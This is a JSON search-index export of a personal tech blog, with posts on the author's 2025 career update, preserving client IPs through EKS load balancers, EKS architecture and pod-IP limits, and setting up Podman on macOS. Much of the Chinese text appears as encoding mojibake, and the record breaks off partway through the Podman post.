[{"title":"2025 Life Update","url":"/2025/04/12/","content":"\n## è¿‘æ³\n\nè·é›¢ä¸Šä¸€ç¯‡æ–‡ç« æ›´æ–°å·²ç¶“è¶…éå…©å¹´ã€‚å‰å¹¾å¤©å‰›å¥½åœ¨ CloudFlare ä¸Šé¢èª¿æ•´ DNS Records ç™¼ç¾é€™å€‹ blog çš„æ¯é€±è§£ææ•¸é‡é‚„æ˜¯æœ‰å¤šé”åƒäººï¼Œå› æ­¤æˆ‘è¦ºå¾—éœ€è¦æ›´æ–°ä¸€ä¸‹è¿‘æ³è®“é•·æœŸæœ‰åœ¨å°ˆæ³¨è©² blog çš„å„ä½çŸ¥é“æœ¬ç«™ç›®å‰çš„ç‹€æ³ã€‚\n\nç”±æ–¼ä¸€ä¸‹è·æ¶¯ä¸Šçš„é•·æœŸè€ƒé‡ï¼Œæˆ‘å¾å°åŒ—çš„ AWS é›¢è·ï¼Œç¾åœ¨æ­£åœ¨åŒ—ç¾å°‹æ‰¾æ›´å¤šæ©Ÿæœƒã€‚è€Œå°ˆæ³¨çš„äº‹æƒ…ä¹Ÿæš«æ™‚å¾é›²ç«¯åŸºç¤è¨­æ–½ç®¡ç†æ…¢æ…¢è½‰å‘ AI å·¥å…·å¦‚ä½•å¹«åŠ©é–‹ç™¼è€…æ›´å¿«å®Œæˆç›®æ¨™ã€‚AI çš„å¿«é€Ÿç™¼å±•å¤§å¹…ç¸®çŸ­äº†é–‹ç™¼ç”¢å“æ‰€éœ€è¦çš„æ™‚é–“ï¼Œé›–ç„¶é›²ç«¯åŸºç¤è¨­æ–½é ˜åŸŸé‚„æ²’æœ‰å‘å‚³çµ±é–‹ç™¼é ˜åŸŸä¸€æ¨£å—åˆ°åš´é‡è¡æ“Šï¼Œä½†æ˜¯å¯é è¦‹çš„å°‡ä¾†é€™ä¸€å¤©é²æ—©æœƒç™¼ç”Ÿã€‚è€Œæˆ‘ä¹Ÿéå¸¸æœŸå¾…çœ‹åˆ°é€™ä¸€å¤©çš„åˆ°ä¾†ï¼Œåˆ°æ™‚å€™æœƒæœ‰å¤§é‡çš„æ–°å‹æ…‹é–‹ç™¼è€…æœ‰èƒ½åŠ›é–‹ç™¼å‡ºå„å¼å„æ¨£çš„è»Ÿé«”æœå‹™ã€‚\n\nå¾ 2022 å¹´å·¥ä½œä¹‹å¾Œæˆ‘å·²ç¶“å¾ˆå°‘æ›´æ–° blog æ–‡ç« ã€‚åŸå› é™¤äº†æ¥è§¸åˆ°çš„æœå‹™éƒ½æ˜¯èˆ‡ AWS EKS æœ‰é—œä»¥å¤–ï¼Œç”±æ–¼ä¸€äº›å…¬å¸ä¸Šçš„æ”¿ç­–ï¼Œå¯«å¤ªå¤šæŠ€è¡“ç´°ç¯€å¯èƒ½æˆ–å¤šæˆ–å°‘æœƒé€æ¼åˆ°å®¢æˆ¶çš„åŸºç¤è¨­æ–½æ¶æ§‹ã€‚å› æ­¤ä¾¿å¾ˆå°‘é€²è¡Œæ–‡ç« æ›´æ–°ã€‚å¦å¤–ä¸€é»æ˜¯å·¥ä½œä¹‹å¾Œï¼Œæˆ‘å¾ˆå°‘åœ¨é›»è…¦ä¸Šé€²è¡Œå¤ªå¤šå€‹äººåŒ–è¨­å®šä»¥åŠé‘½ç ”å…¶ä»–åº•å±¤æŠ€è¡“ï¼ˆåŒæ¨£å› ç‚ºå…¬å¸æ”¿ç­–ï¼‰ã€‚\n\nç„¶è€Œåˆ°äº†åŒ—ç¾ä¹‹å¾ŒåŸæœ¬ä»¥ç‚ºæœƒæœ‰æ™‚é–“ç¹¼çºŒé€²è¡Œä¸€äº›æ›´æ–°ï¼Œä½†æ˜¯ç”±æ–¼æ‰¾å¯¦ç¿’ä»¥åŠå…¶ä»–é›œäº‹èŠ±æ‰äº†æˆ‘å¤§é‡çš„æ™‚é–“ä»¥å¤–ã€‚å¦å¤–åœ¨åŒ—ç¾æ‰¾å¯¦ç¿’ä¸å¤–ä¹å°±æ˜¯æº–å‚™ Leetcode åˆ·é¡Œï¼Œè€Œé€™å€‹éç¨‹å°æ–¼ä¾†èªªæŒºæ¯ç‡¥ä¹å‘³ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ‡‰è©²å¯«äº›ä»€éº¼ä¾†åˆ†äº«ï¼Œè‡³å°‘æˆ‘å€‹äººå°æ–¼é€™å€‹éç¨‹æ²’ä»€éº¼ç†±æƒ…ã€‚åªæ˜¯ç‚ºäº†æ‹¿ Offer è€Œå»åˆ·é¡Œã€‚\n\nå‰›å¥½ 4 æœˆæ˜¯ä¸€å€‹æ–°å­¸æœŸçš„é–‹å§‹ï¼Œæ‰¾å¯¦ç¿’ä¹Ÿåˆ°ä¸€å€‹æ®µè½ã€‚æˆ‘æœ‰æ›´å¤šæ™‚é–“å¯ä»¥å°ˆæ³¨åœ¨ä¸€äº› AI é ˜åŸŸçš„æƒ³æ³•ä¸Šï¼Œä»¥åŠç”¨å¿ƒå»å¥½å¥½é«”é©—åœ¨åŒ—ç¾çš„ç”Ÿæ´»ã€‚å› æ­¤æœ‰äº†é€™ä¸€ç¯‡æ›´æ–°çš„èª•ç”Ÿã€‚\n\nè‹¥èº«ç‚ºè®€è€…ä½ æœ‰æƒ³æ³•æˆ–æ˜¯ä¸€äº›ç–‘å•æƒ³è¦äº¤æµï¼Œæ­¡è¿ç›´æ¥è¯çµ¡æˆ‘ï¼ˆä½ å¯ä»¥é€éä¸€äº›é€£çµæ‰¾åˆ°æˆ‘çš„è¯çµ¡æ–¹å¼çš„ï¼‰ğŸ“§\n\nï¼ˆä»¥ä¸‹æ˜¯è‹±æ–‡ç‰ˆæœ¬ï¼‰\n\n## Life Update\n\nItâ€™s been more than two years since my last blog post. A few days ago, while I was updating some DNS records on Cloudflare, I noticed that this blog still gets thousands of DNS queries every week. That made me feel itâ€™s time for an update â€” especially for those whoâ€™ve been following this blog for a while.\n\nFor long-term career reasons, I decided to leave AWS in Taipei and am now exploring new opportunities in North America. My focus has also shifted gradually â€” from managing cloud infrastructure to exploring how AI tools can help developers build faster and more efficiently. The rapid growth of AI has already shortened product development cycles a lot. While cloud infrastructure hasnâ€™t been impacted as heavily as traditional software engineering (yet), itâ€™s only a matter of time. Iâ€™m genuinely excited to see what the future holds â€” I believe many new types of developers will soon be able to create all kinds of software services with the help of AI.\n\nSince I started working in 2022, Iâ€™ve rarely updated this blog. One reason is that most of my work involved AWS EKS. Because of company policies, writing about technical details might accidentally expose parts of our clientsâ€™ infrastructure, so I avoided publishing too much. Another reason is that after starting full-time work, I rarely tinkered with my personal setup or explored low-level tech (again, mostly due to company rules).\n\nAfter moving to North America, I originally thought Iâ€™d have more time to write again. But job hunting â€” especially looking for internships â€” took up a lot of time. And to be honest, prepping for internships here mostly means grinding Leetcode. I find that process pretty dry and uninspiring, so I didnâ€™t really know what to share. I was solving problems not out of interest, but just to get an offer.\n\nNow that itâ€™s April â€” the start of a new academic term â€” and my internship search is mostly done, I finally have more time to focus on AI-related ideas and enjoy life here in North America. Thatâ€™s what motivated me to write this update.\n\nIf youâ€™re a reader and have any thoughts or questions youâ€™d like to discuss, feel free to reach out to me directly (you can find my contact info through the links on this blog) ğŸ“§\n\n","tags":["life"]},{"title":"EKS ELB ç²å– Client IP æ–¹æ³•ç´€éŒ„","url":"/2022/09/05/","content":"\n## å‰è¨€\n\nåœ¨ EKS ä¸Šè¦å»ºç«‹ ELB æœƒæ¡ç”¨ service type æŒ‡å®š LoadBalancerã€‚æ­¤æ™‚ AWS çš„ In-Tree LoadBalacner Controller æˆ–æ˜¯ [AWS Load Balancer Controller](https://github.com/kubernetes-sigs/aws-load-balancer-controller) å…¶ä¸­ä¹‹ä¸€æœƒå”åŠ©æˆ‘å€‘å»ºç«‹å°æ‡‰çš„ ELB å‡ºä¾†ã€‚æœ¬æ–‡ç´€éŒ„é€™å…©ç¨® LB Controller çš„å·®ç•°ä»¥åŠä¸åŒé¡å‹ ELB ä½¿ç”¨æ™‚æ©Ÿï¼ˆä»¥ç²å– Client IP ç‚ºä¾‹ï¼‰ã€‚\n\n## In-Tree LoadBalacner Controller - CLB\n\nå°‡ server type æŒ‡å®šæˆ `LoadBalancer` æ­¤æ™‚ In-Tree LoadBalacner Controller æœƒ privosion ä¸€å€‹ CLB å‡ºä¾†\n\næµé‡å¾å¤–éƒ¨è¦é€²å…¥å¢é›†çš„è·¯å¾‘ç‚º\n\nCLB -> Node:NodePort -> Pod maybe in different node\n\nå› ç‚ºé€éç¯€é»ä¸Šçš„ NodePort é€²è¡Œè·³è½‰ï¼Œæ‰€ä»¥ Pod å¦‚æœè¦ç²å¾— Clinet IP æœƒæ‹¿åˆ° Node ä¸­çš„ IPã€‚è€Œç²å–ä¸åˆ°çœŸæ­£çš„ Client IP\n\næ¥è‘—å¯ä»¥æ ¹æ“šå®˜æ–¹å»ºè­°è¨­å®š `.spec.externalTrafficPolicy` ç‚º `Local`ï¼ˆé è¨­ç‚º `Cluster`ï¼‰\n\né€™æ¨£çš„è¨­å®šå¯ä»¥é¿å…æµé‡é€²å…¥åˆ°æ²’æœ‰å« Destination Pod çš„ Node ä¸Šï¼Œå¤šåšä¸€å€‹ hop çš„è·³è½‰ï¼Œä¹Ÿé¿å… IP è¢«æ´—æˆè©² Node çš„ IP\n\nçµæœç™¼ç¾ Client IP é‚„æ˜¯ç²å–ä¸åˆ°ï¼Œå› ç‚º CLB åœ¨èˆ‡å¾Œæ–¹çš„ instance æºé€šæ™‚ï¼Œæ˜¯ç”¨è©² subnet ä»‹é¢çš„ IP æºé€šï¼Œæ‰€ä»¥ Client IP è®Šæˆæ˜¯ ELB çš„ private IPï¼ˆè©² IP å¯ä»¥å¾ ec2 çš„ network interfacae æ‰¾å‡ºä¾†ï¼‰\n\nç¾åœ¨çš„è·¯å¾‘è®Šæˆ\n\nCLB -> Node:NodePort ï¼ˆPod also in the nodeï¼‰\n\né–‹å•Ÿäº† `externalTrafficPolicy` éœ€ä¸éœ€è¦æ“”å¿ƒå¦‚æœè©²ç¯€é»ä¸Šæ²’æœ‰ Podï¼Œé€²è€Œè«‹æ±‚æ²’æœ‰è¾¦æ³•è·¯ç”±åˆ°æ­£ç¢ºçš„ä½ç½®ä¸Š\n\nç­”æ¡ˆæ˜¯ä¸éœ€è¦ï¼Œå› ç‚º CLB æœƒå°å¾Œæ–¹çš„ instance åšå¥åº·æª¢æŸ¥ï¼Œè‹¥å¾Œæ–¹ instance æ²’æœ‰ Podï¼Œé‚£æŸè©² instance ä¸å¥åº·ï¼Œæµé‡è‡ªç„¶ä¸æœƒå°å…¥éå»\n\n```\nå„ªé»ï¼šå®Œå…¨ä¸éœ€ä¿®æ”¹åƒæ•¸ã€ä¸éœ€å®‰è£å…¶ä»– controller\nç¼ºé»ï¼šç„¡æ³•ä¿ç•™ Client IPã€ä¸ä¿ç•™ Client IP æµé‡æœƒå¤šä¸€è·³ã€æµé‡ä¸å¹³å‡ï¼ˆå¾Œé¢æœƒæåˆ°ï¼‰\n```\n\n## In-Tree LoadBalacner Controller - NLB\n\néœ€è¦åœ¨ annotations åŠ ä¸Š\n\n```yaml\nannotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: \"nlb\"\n```\n\nä¸¦ä¸”æˆ‘å€‘å°‡ `externalTrafficPolicy` åŒæ¨£è¨­å®šæˆ `Local`\n\nç™¼ç¾å°±å¯ä»¥æ­£å¸¸ç²å– Client IP äº†ï¼Œä»£è¡¨ NLB åœ¨è½‰ç™¼æ™‚ï¼Œä¸æœƒå°‡ Source IP ä»‹é¢åˆ‡æ›æˆå…§ç¶²ä»‹é¢ï¼ŒåŒæ™‚å¾Œç«¯ä¹Ÿä¸æ˜¯ instance æ˜¯å¦å¤–ä¸€å±¤æŠ½è±¡ï¼ˆtarget groupï¼‰\n\nä½†è©¦æƒ³ä¸€å€‹ä¸€å€‹æƒ…æ³ï¼Œè‹¥æˆ‘æœ‰ 3 å€‹ Pod (x, y, z)ï¼Œ2 å€‹ (x, y) è½åœ¨ç¯€é» Aï¼Œ1 å€‹ (z) è½åœ¨ç¯€é» B\n\né‚£éº¼æµé‡é€²å…¥ NLB æ™‚æœƒå…ˆé€²è¡Œ 1/2 çš„æ©Ÿç‡é¸æ“‡ç¯€é» (A, B)ï¼Œå‡è¨­é€²å…¥ç¯€é» A åˆæœƒæœ‰ 1/2 çš„æ©Ÿç‡é¸æ“‡ x, y é€™å…©å€‹ Pod\n\né‚£éº¼ Pod è¢«é¸ä¸­çš„æ©Ÿç‡è®Šæˆ\n\nx: 1/2 * 1/2 = 1/4\ny: 1/2 * 1/2 = 1/4\nz: 1/2\n\nå¯ä»¥ç™¼ç¾æµé‡ä¸¦æ²’æœ‰çœŸçš„å¹³å‡è½‰ç™¼éƒ½å¾Œç«¯çš„ Pod ä¸Š\n\nä½† In-Tree Controller åªèƒ½å»ºç«‹å‡ºé€™å…©ç¨® ELBï¼ˆä¸¦ä¸”èƒ½ä¿®æ”¹çš„åƒæ•¸æœ‰é™ï¼‰ï¼Œå‰©ä¸‹ä¸€ç¨® ALB å¿…é ˆå®‰è£ [AWS Load Balancer Controller](https://github.com/kubernetes-sigs/aws-load-balancer-controller)\n\n```\nå„ªé»ï¼šä¸éœ€å®‰è£å…¶ä»– controllerã€å¯ä»¥ä¿ç•™ Client IP\nç¼ºé»ï¼šä¸ä¿ç•™ Client IP æµé‡æœƒå¤šä¸€è·³ã€æµé‡ä¸å¹³å‡\n```\n\n## AWS Load Balancer Controller - NLB\n\nå®‰è£ AWS Load Balancer Controller å¾Œï¼Œåœ¨ä½¿ç”¨ä¸Šå¿…é ˆæŒ‡å®š `loadBalancerClass: service.k8s.aws/nlb`\n\nä¸¦ä¸” AWS Load Balancer Controller æœ‰æä¾› `ip` èˆ‡ `instance` modeï¼ˆä½¿ç”¨ in-tree controller å»ºç«‹å‡ºä¾†çš„ mode å°±æ˜¯ instance modeï¼‰\n\n*è©²åŠŸèƒ½éœ€è¦é…åˆ AWS VPC CNI ä½¿ç”¨*\n\n```\nannotations:\n    service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing\n    service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip\nspec:\n    loadBalancerClass: service.k8s.aws/nlb\n```\n\næ­¤æ™‚æœƒç™¼ç¾ NLB å¾Œæ–¹çš„ target group ç›´æ¥å°æ‡‰åˆ° Pod IPï¼Œå¯ä»¥çœå»å¤šä¸€æ¬¡è·³è½‰ï¼Œä¸¦ä¸”è§£æ±ºæµé‡ä¸å¹³å‡çš„å•é¡Œ\n\nä½† Client IP é‚„æ˜¯æ²’æœ‰ä¿ç•™ï¼Œæˆ‘å€‘å¯ä»¥èª¿æ•´ NLB åƒæ•¸\n\n```\nannotations:\n    service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: preserve_client_ip.enabled=true\n```\n\nå°‡ NLB æä¾›çš„åŠŸèƒ½ preserve_client_ip æ‰“é–‹ï¼Œå³å¯å®Œæˆé…ç½®ï¼Œä¹Ÿä¸éœ€è¦é€éè¨­å®š `externalTrafficPolicy` åƒæ•¸å³å¯ç²å– Client IP\n\n\n```\nå„ªé»ï¼šä¿ç•™ Client IPã€æµé‡ä¸æœƒå¤šä¸€è·³ã€æµé‡å¹³å‡\nç¼ºé»ï¼šéœ€å®‰è£å…¶ä»– controller\n```\n\n## AWS Load Balancer Controller - ALB\n\nä½¿ç”¨ Ingress è³‡æºå»ºç«‹å‡º ALBï¼Œä½†æ˜¯ç„¡æ³•è¨­å®š `preserve_client_ip`\n\nå¦‚æœå» management console æª¢æŸ¥å°æ‡‰ target groupï¼Œæœƒç™¼ç¾æ‰¾ä¸åˆ° Preserve client IP addresses ä½†æ˜¯å¤šäº† Load balancing algorithm å¯ä»¥é¸æ“‡\n\n\nå› ç‚ºæ˜¯ L7 æ”¯æ´ï¼Œæ‰€ä»¥å°‡ Client IP æ”¾å…¥ HTTP header çš„ XFF æ¬„ä½å³å¯\n\nä¸€æ¨£æœ‰ `instance` èˆ‡ `ip` mode å¯ä»¥é¸æ“‡\n\n```\nå„ªé»ï¼šä¿ç•™ Client IPï¼ˆæ”¾åœ¨ L7 çš„ HTTP header ä¸­ï¼‰ã€æµé‡ä¸æœƒå¤šä¸€è·³ã€æµé‡å¹³å‡\nç¼ºé»ï¼šéœ€å®‰è£å…¶ä»– controller\n```","tags":["AWS","EKS","ELB","Kubernetes"]},{"title":"å»ºç«‹ Reliable EKS è¨˜éŒ„","url":"/2022/08/30/","content":"\n## å‰è¨€\n\nEKS çš„å»ºç«‹æ–¹ä¾¿å¿«é€Ÿï¼Œå…¶ä¸­æœ‰äº›æ¦‚å¿µèŠ±äº†äº›æ™‚é–“æ‰é‡æ¸…ï¼Œç”šè‡³æœ‰äº›æ‹“å¢£ä¸€é–‹å§‹æƒ³éŒ¯äº†ã€‚ç¶“éå¹¾é€±æŸ¥é–±æ–‡ä»¶èˆ‡å¯¦é©—å¾Œï¼Œå¯«å€‹å°çš„ç¸½çµåšå€‹ç°¡å–®çš„ç´€éŒ„ã€‚\n\n## Architecture\n\n- EKS åªæœ‰ç¶­è­· Control Planeï¼ŒWorker æœ‰ EC2 èˆ‡ Fargate å¯ä»¥é¸æ“‡ã€‚å…¶ä¸­ EC2 å¿…é ˆç”±ä½¿ç”¨è€…è‡ªè¡Œç®¡ç†ã€‚\n- EKS Control Plane çš„ VPC èˆ‡ Cluster çš„ VPC ç‚ºä¸åŒçš„ VPC\n- å¦‚æœ EKS æœ‰é–‹å•Ÿ Private Accessï¼Œæœƒåœ¨ Cluster VPC çš„ subnet ä¸­å®‰æ’ EKS-managed ENI è®“ Cluster VPC æµé‡ç©¿é€è‡³ EKS ä¸­\n- EKS å»ºç«‹æ™‚é¸æ“‡çš„ VPC æ˜¯ç‚ºäº†éƒ¨ç½² EKS-managed ENIï¼ˆæœ€å°‘å…©å€‹ï¼‰ä½¿ç”¨\n- EKS-managed ENI ç›´æ¥å­˜åœ¨æ–¼ subnet ä¹‹ä¸­ï¼Œé EC2 instanceï¼ˆor å…¶ä»– instanceï¼‰ä¹‹ä¸Š\n\n## Nodegroup\n\nå¦‚æœ Nodegroup å®Œå…¨ç„¡æ³•å­˜å–å¤–ç¶²ï¼ŒåŒæ™‚ä¹Ÿå°±ç„¡æ³•æ‹‰å–å¿…è¦çš„ Container Imageï¼Œå°è‡´ç¯€é»ç„¡æ³•å»ºç«‹æˆåŠŸ\n\nNodegroup å¦‚æœè½åœ¨ private subnetï¼Œå¯ä»¥å¤šé–‹ä¸€å°æœ‰ public subnet çš„ EC2 ä½œç‚º bastion ä½¿ç”¨ï¼ˆåŒä¸€å€‹ VPC ä¸‹ï¼‰\n\n## API Endpoint\n\n### public access\n\nAPI endpoint domain æœƒå°æ‡‰åˆ°ä¸€çµ„ Public IP åšç‚º API Endpoint å…¥å£\n\nå¯ä»¥ä½¿ç”¨ `kubectl cluster-info` æŸ¥çœ‹\n```\n[ec2-user@eks-bastion]$ kubectl cluster-info\nKubernetes control plane is running at https://<your api endpoint uuid>.gr7.<region>.eks.amazonaws.com\n```\n\n### private access\n\næ ¹æ“š[å®˜æ–¹æ–‡ä»¶](https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html)æè¿°ï¼Œåœ¨ Cluster VPC ä¸‹æœƒæœ‰ Route 53 private hosted zone å°‡ API endpoint è§£ææˆè©² VPC ä¸‹çš„ IP\n\n> This private hosted zone is managed by Amazon EKS, and it doesn't appear in your account's Route 53 resources.\n\nç¶“éå¯¦é©—æœƒç™¼ç¾è§£å‡ºå…©çµ„ VPC ä¸­çš„ private IPï¼ŒåŒæ™‚ç‚º EKS-managed ENI çš„ IP\n\né€™çµ„ä»‹é¢å¯ä»¥é€éå°‡ Cluster VPC çš„æµé‡ç›´æ¥å°å‘è‡³ EKS VPC ä¹‹ä¸­\n\nå•Ÿç”¨æ¢ä»¶ç‚º Cluster VPC å¿…é ˆå°‡ `enableDnsHostnames`, `enableDnsSupport` è¨­å®šç‚º `true`\n\nä¸¦ä¸” `AmazonProvidedDNS` è¦åœ¨ VPC DHCP çš„ domain name servers list\n\n### public and private access\n\nå¤–ç¶²å› ç‚ºæ²’æœ‰ Route 53 private hosted zone æ‰€ä»¥æœƒè§£æå‡ºå¤–ç¶² IP\n\nCluster VPC ä¸‹æœ‰ Route 53 private hosted zone æ‰€ä»¥æœƒè§£æå‡º EKS-managed ENI çš„ IP\n\n## Pod Amount Limit\n\nPod limit çš„æ ¹æœ¬å•é¡Œæ˜¯å› ç‚ºä¸åŒçš„ EC2 instance type æœ‰å…ˆå¤©çš„ VPC IP æ•¸é‡é™åˆ¶\n\nENI çš„æ•¸é‡æœ‰é™åˆ¶ï¼Œæ¯ä¸€å€‹ ENI instance å¯ä»¥æŒ‡å®šçš„ IP æ•¸é‡ä¹Ÿæœ‰é™åˆ¶\n\nå®˜æ–¹æœ‰çµ¦å‡ºä¸€ä»½è¨ˆç®—å¾Œçš„é™åˆ¶åˆ—è¡¨å¯ä»¥é€²è¡ŒæŸ¥é–± [eni-max-pods.txt](https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt)\n\nçªç ´é™åˆ¶å‰å…ˆé‡æ¸…è‡ªå·±çš„å¢é›†ç‚ºä½•è¢«é™åˆ¶ï¼Œä»¥ä¸‹ç‚ºå¹¾ç¨®å¯èƒ½\n\n### limited by subnet CIDR\n\nsubnet çš„ CIDR ä¸€é–‹å§‹åˆ‡å¤ªå°ï¼Œå°è‡´ Pod æ•¸é‡è¶…é CIDR ç¯„åœæ™‚ï¼Œåƒè€ƒ VPC CNI çš„ [AWS_VPC_K8S_CNI_CUSTOM_NETWORK_CFG](https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt) åƒæ•¸ï¼Œä¾†å®¢è£½åŒ– Pod çš„ CIDRã€‚\n\n### limited by EC2 instance type\n\næœ€å¸¸è¦‹çš„æƒ…æ³ï¼Œé”åˆ° EC2 ä¸Šçš„ IP æ•¸é‡é™åˆ¶ï¼Œå› æ­¤ VPC CNI ç„¡æ³•æˆåŠŸç´¢å– IPã€‚\n\næ–¹æ³•ä¸€ï¼š\n\nç›´æ¥æŠ½æ› AWS VPC CNIï¼Œæ›æ‰ä¹‹å¾Œ Node å°±ä¸æœƒå†æŒçºŒç´¢å– secondary private IPv4 addressesï¼Œä¸éæŠ½æ›å¾Œï¼Œæ²’æœ‰è¾¦æ³•è®“ Pod çš„ IP ç›´æ¥å±¬æ–¼ VPC ä¸‹çš„ IPï¼ˆç†è«–æ•ˆèƒ½æœƒå·®ä¸€äº›ï¼Œæµé‡å¯èƒ½é ˆç¶“é NAT è½‰æ›ï¼‰ã€‚\n\næ–¹æ³•äºŒï¼š\n\nä½¿ç”¨ 2021 å¹´ EC2 æ–°æ¨å‡ºçš„åŠŸèƒ½ `prefix assignment`ã€‚é–‹å•Ÿ AWS VPC CNI ä¸­çš„ `ENABLE_PREFIX_DELEGATION` åƒæ•¸ã€‚å°‡æ¯ä¸€å€‹ ENI ä¸ŠåŸæœ¬å¯ä»¥é™„åŠ çš„ secondary private IPv4 addresses è®Šæˆè®Šç‚º /28 ç¯„åœï¼ˆ16 å€‹ IPsï¼‰ã€‚\n\nåƒè€ƒ [Increase the amount of available IP addresses for your Amazon EC2 nodes\n](https://docs.aws.amazon.com/eks/latest/userguide/cni-increase-ip-addresses.html)\n\n### limited by insufficient IP's\n\nè©² subnet ä¸‹çš„ IP è¢«å…¶ä»–ç¯€é»æˆ–æ˜¯å…¶ä»–æ‡‰ç”¨ç´¢å–å®Œç•¢ï¼Œå°è‡´æŸäº›ç¯€é»çš„ `aws-node` (VPC CNI) æ²’æœ‰è¾¦æ³•æ­£å¸¸ç´¢å– IPã€‚è§£æ±ºæ–¹æ³•ç‚ºè¨­å®š `WARM_ENI_TARGET` èˆ‡ `WARM_IP_TARGET` åƒæ•¸ï¼Œä¾†è®“å‰›ç¯€é»ä¸€è¢«éƒ¨ç½²æ™‚å°±é å…ˆä¿ç•™å¥½å¯ç”¨çš„ IPï¼Œå³æ™‚ç•¶æ™‚ Pod é‚„æ²’æœ‰è¢«å»ºç«‹ã€‚\n\n## Customize kubelet Arguments\n\næŸäº›æ™‚å€™éœ€è¦å®¢è£½åŒ–æˆ‘å€‘çš„ç¯€é»ï¼Œä¾‹å¦‚ä¿®æ”¹ container runtimeï¼ˆEKS 1.23 å·²ç¶“å°‡é è¨­ container runtime æ›æˆ containerdï¼‰\n\nAmazon EKS optimized Amazon Linux AMI åœ¨é–‹æ©Ÿæ™‚æœƒå‘¼å« `/etc/eks/bootstrap.sh` åœ¨åŸ·è¡Œå¿…è¦çš„åˆå§‹åŒ–\n\nç„¶è€Œè©²è…³æœ¬å°±æœ‰æä¾›åƒæ•¸å¯ä¾›èª¿æ•´ï¼Œä¾‹å¦‚æˆ‘æƒ³è¦æ›¿æ› container runtime å¯ä»¥åœ¨ launch template ä¸­æ”¹å¯« user-data æˆ\n\n```shell\n#!/bin/bash\n/etc/eks/bootstrap.sh demo-k8s --container-runtime containerd\n```\n\næƒ³è¦ä¿®æ”¹ kubelet çš„å•Ÿå‹•åƒæ•¸å¯ä»¥ç”¨ `--kubelet-extra-args` ä¾†ä¿®æ”¹\n\n## å¾Œè¨˜\n\nä»¥ä¸Šç‚ºé€™å¹¾é€±ç¬¬ä¸€æ¬¡ä½¿ç”¨ EKS çš„ç´€éŒ„ä»¥åŠå€‹äººèªç‚ºæ¯”è¼ƒå®¹æ˜“æ··æ·†æˆ–æ˜¯æ¨¡ç³Šçš„é»ï¼Œè¦å»ºæ§‹ä¸€å€‹å¯ä¿¡è³´çš„ EKS è¦è€ƒé‡çš„å…§å®¹äº”èŠ±å…«é–€ã€‚é€™é‚„åªæ˜¯ä¸€äº›åœ¨æ¶æ§‹ä¸Šçš„æ¦‚å¿µé‡æ¸…è€Œå·²ï¼Œå¦‚æœè¦å¾€å¢é›†å…§éƒ¨é‘½ç ”ï¼Œæœ‰æ›´å¤šè¦æ³¨æ„èˆ‡å¯ä»¥èª¿æ•™çš„åœ°æ–¹ã€‚é€™ç¯‡æ–‡ç« åŒæ™‚ä¹Ÿçµ¦ä»¥å¾Œçš„è‡ªå·±åƒè€ƒï¼Œæœªä¾†æœ‰æ©Ÿæœƒå†å¯«å…¶ä»–æ–‡ç« æ¢è¨ä¸åŒå±¤é¢éœ€è¦è€ƒé‡çš„è­°é¡Œã€‚\n","tags":["AWS","EKS","Kubernetes"]},{"title":"åœ¨ macOS ä¸Šä½¿ç”¨ Podman","url":"/2022/07/07/","content":"\n## å‰è¨€\n\nPodman ç›¸è¼ƒæ–¼ Docker æœ‰è¨±å¤šå„ªå‹¢ï¼Œæœ¬æ–‡ç‚ºåœ¨ macOS ä¸Šåˆæ¬¡ä½¿ç”¨ Podman ä¹‹ç°¡çŸ­ç´€éŒ„ã€‚éç¨‹ä¸­ä¸æ¢ç©¶å¤ªæ·±å…¥çš„ Podman  é‹ä½œåŸç†ï¼Œå–®ç´”ä¾ç…§ä¸€èˆ¬é‹è¡Œ container çš„æ€æƒ³ä¾†ä½¿ç”¨ Podmanï¼Œçœ‹çœ‹æœƒé‡åˆ°ä»€éº¼å•é¡Œ\n\n## å®‰è£\n\nPodman èˆ‡ Docker ä¸€æ¨£æœ‰æ¡Œé¢ç‰ˆæœ¬èˆ‡éæ¡Œé¢ç‰ˆæœ¬ï¼Œæ¡Œé¢ç‰ˆæœ¬å¤šäº† UI å¯ä¾›æŸ¥çœ‹ï¼ŒæŒ‘é¸ä¸€ç¨®å–œæ­¡çš„å®‰è£å³å¯\n\næ¡Œé¢ç‰ˆï¼š\n\n`brew install podman-desktop`\n\néæ¡Œé¢ç‰ˆï¼š\n\n`brew install podman`\n\næª¢æŸ¥å®‰è£ç‰ˆæœ¬ï¼š\n\n`podman version`\n\n```\nCannot connect to Podman. Please verify your connection to the Linux system using `podman system connection list`, or try `podman machine init` and `podman machine start` to manage a new Linux VM\nError: unable to connect to Podman. failed to create sshClient: Connection to bastion host (ssh://core@localhost:52568/run/user/1000/podman/podman.sock) failed.: dial tcp [::1]:52568: connect: connection refused\n```\n\né¦¬ä¸Šé‡åˆ°ç¬¬ä¸€å€‹å•é¡Œï¼ŒæŒ‰ç…§æç¤ºä½¿ç”¨ `podman machine init` ä¾†å»ºç«‹ Linux VMï¼Œé‹ä½œåŸç†çŒœæ¸¬èˆ‡ Docker on macOS  é¡ä¼¼ï¼Œä¸é Docker Desktop ä¸ç”¨æ‰‹å‹•å»ºç«‹ VM\n\næª¢æŸ¥æ˜¯å¦æœ‰å•Ÿå‹• podman éœ€è¦çš„ VMï¼š\n\n`podman machine list`\n\n```\nNAME                     VM TYPE     CREATED         LAST UP        CPUS        MEMORY      DISK SIZE\npodman-machine-default*  qemu        37 minutes ago  3 minutes ago  1           2.147GB     10.74GB\n```\n\nå¯ä»¥çœ‹åˆ° VM å·²ç¶“è¢«æ­£ç¢ºå•Ÿå‹•ï¼ˆè€Œä¸”æ˜¯ä½¿ç”¨ qemu ä¾†å•Ÿå‹•çš„ï¼‰ï¼Œä½†ä¾ç…§å ±ä¸€æ¨£çš„éŒ¯èª¤ã€‚å¾Œä¾†æŸ¥äº† [issue#12728](https://github.com/containers/podman/issues/12728) ç™¼ç¾ Podman å˜—è©¦ä½¿ç”¨ $SSH_AUTH_SOCK è®Šæ•¸è¨­å®šçš„ address ä¾†é€£ç·šï¼Œå¯ä»¥å–æ¶ˆè¨­ç½®è©²è®Šæ•¸ä¾†è§£æ±ºè©²å•é¡Œ\n\n```\nunset SSH_AUTH_SOCK\n```\n\nï¼ˆè«‹ä¾ç…§ä½ çš„ shell 